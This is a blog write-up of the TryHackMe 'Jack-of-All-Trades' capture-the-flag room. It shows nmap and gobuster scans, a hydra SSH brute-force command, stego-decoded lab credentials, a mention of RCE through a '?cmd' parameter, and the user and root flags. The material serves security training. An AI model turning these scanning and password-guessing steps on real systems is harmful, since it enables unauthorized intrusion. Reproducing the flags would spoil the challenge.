---
title: "Jack-of-All-Trades - TryHackMe"
author: Ludovic COULON
date: 2020-06-28
hero: ./images/hero.jpeg
excerpt: "Writeup for the Jack-of-All-Trades - boot-to-root originally designed for Securi-Tay 2020"
---

[TryHackMe | Jack-of-All-Trades](https://tryhackme.com/room/ctfcollectionvol2)

Jack is a man of a great many talents. The zoo has employed him to capture the
penguins due to his years of penguin-wrangling experience, but all is not as it seems...

We must stop him! Can you see through his facade of a forgetful old toy-maker and bring this lunatic down?

---

### Setup

```bash
nmap -A -vv 10.10.134.255
```

```bash
22/tcp open  http    syn-ack Apache httpd 2.4.10 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)

80/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBANucPy+D67M/cKVTYaHYYpt9bqPviYbWW/4+BFnUOQoNordc9Pc+8CauJqNFiebIqpKYKXhpEAt82m1IjQh8EmWdJYcQnkMFgukM3/mGjngXTbUO8vAbi53Zy8wwOaBlmRK9mvfAYEWPkcjzRmYgSp51TgEtSGWIyAkc1Lx6YVtDAAAAFQCsIgZJlrsYvAtF7Rmho7lIdn0WOwAAAIEApri35SyOophhqX45JcDpVASe3CSs8tPMGoOc0I9ZtTGt5qyb1cl7N3tXsP6mlrw4d4YNo8ct0w6TjsxPcJjGitRQ+SILWHy72XZ5Chde6yewKB5BeBjXrYvRR1rW+Tpia5kyjB4s0mGB7o3FMjX/dT+ISqYvZeVa7mQnBo0f0XMAAACAP89Ag2kmcs0FBt7KCBieH3UB6gF+LdeRVJHio5p4VQ8cTY1NZDyWqudS1TJq1BAToJSz9MqwUwzlILjRjuGQtylpssWSRbHyM0aqmJdORSMOCMUiEwyfk6T8+Vmama/AN7/htZeWBjWVeVEnbYJJQ6kPSCvZodMdOggYXcv32CA=
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbCwl2kyYWpv1DPDF0xQ5szNR1muMph6gJMJFw9VubKkSvHMWfg7CaCNcyo1QR5dg9buIygIGab8e9aigJdjQUY4XeBejwGe+vAA8RtPMoiLclR6g5qAqVQSeZ2FBzMrmkyKIgsSDb8tP+czpzn/Gp1HzDtiYUvleTvO2xEZ3k2Xz8YDvPlkV4zAIPzZSSZ8BABPYsBrePIwMpr/ZjeeiE59DlkUIv8x8M0z9KOls9zaeqFsbWrfMZzFgtPP+KILN6GrGijxgcGq5mDwvr67oHL3T3FtpReE+UZ/CafmzO/2Ls8XstmUiNeMaNBYtc6703/84bpL0uLp/pkILS8eqX
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO4p2E6NglzDeP40tJ42LjWaVrOcINmy42cspAv8DSzGD0K+V3El/tyGBxCJlMMR7wbN0968CQl61x0AkkAHLFk=
|   256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6jYsDJq1mWTDx7D+p3mMbqXhu9OhhW2p1ickLCdZ9E
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As you can see by the nmap scan the port 22 is a web server.

<div className="Image__Medium">
  <img src="https://imgur.com/HbuGSmv.png" alt="blog_image" />
</div>

[How to allow a restricted port?](https://support.mozilla.org/en-US/questions/1083282#question-reply)

<div className="Image__Medium">
  <img src="https://imgur.com/8MM4L6y.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/BAAHVL1.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/x9t2KSO.png" alt="blog_image" />
</div>

Nice ! It worked, let's see if there is some hidden directory 😊

```bash
➜  TryHackMe gobuster dir -u http://10.10.134.255:22/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<div className="Image__Medium">
  <img src="https://imgur.com/xrD1K8Z.png" alt="blog_image" />
</div>

On source code of the homepage you can see there is some hidden message and a assets called "assets/stego.jpg" let's download the image and decode the message shall we ?

<div className="Image__Medium">
  <img src="https://imgur.com/Eb7xkuj.png" alt="blog_image" />
</div>

```
Remember to wish Johny Graves well with his crypto jobhunting!
His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

<div className="Image__Medium">
  <img src="https://imgur.com/XuUoZk8.png" alt="blog_image" />
</div>

Well, let's try the other images 😞

<div className="Image__Medium">
  <img src="https://imgur.com/VvCRC8g.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/pDG3iCg.png" alt="blog_image" />
</div>

```
Username: jackinthebox
Password: TplFxiSHjY
```

Great ! we found some credentials let's find the cms 🤨

Ok ! I found it, to find the cms you need to go to the homepage and see the source code of the page.

<div className="Image__Small">
  <img src="https://imgur.com/1Dzbs6u.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/g1MXfqH.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/f4nDpbE.png" alt="blog_image" />
</div>

Let's decode the hidden message 😊

<div className="Image__Medium">
  <img src="https://imgur.com/nlyCJfG.png" alt="blog_image" />
</div>

```
Remember that the credentials to the recovery login are hidden on the homepage!
I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

This is just a hint, but we already have the credentials let's use it.

<div className="Image__Medium">
  <img src="https://imgur.com/Ovwwmvk.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/XLSDYwm.png" alt="blog_image" />
</div>

Ok, this is some basic RCE let's use the variable "?cmd"

<div className="Image__Medium">
  <img src="https://imgur.com/oarM6xv.png" alt="blog_image" />
</div>

Let's see if thre is something on the /home path

<div className="Image__Medium">
  <img src="https://imgur.com/wP495Qk.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/4WFCneV.png" alt="blog_image" />
</div>

Let's crack the password of the ssh user 'jack' with the given wordlist, we will use hydra.

```
➜  TryHackMe hydra -l jack -P jack_wordlist.txt 10.10.134.255 -s 80 ssh
```

<div className="Image__Medium">
  <img src="https://imgur.com/SC7HTrY.png" alt="blog_image" />
</div>

```
jack:ITMJpGGIqg1jn?>@
```

<div className="Image__Medium">
  <img src="https://imgur.com/DkRwcid.png" alt="blog_image" />
</div>

### #1 User Flag

```
jack@jack-of-all-trades:~$ python -m SimpleHTTPServer
```

<div className="Image__Medium">
  <img src="https://imgur.com/OEkFcsG.png" alt="blog_image" />
</div>

```
securi-tay2020_{p3ugu1n-hunt3r-3xtr40rd1n41r3}
```

### #2 Root Flag

<div className="Image__Medium">
  <img src="https://imgur.com/wD0wagv.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/otR1TZZ.png" alt="blog_image" />
</div>

```
securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/kUD3W5P.png" alt="TryhackMeProfile" />
  </a>
</center>
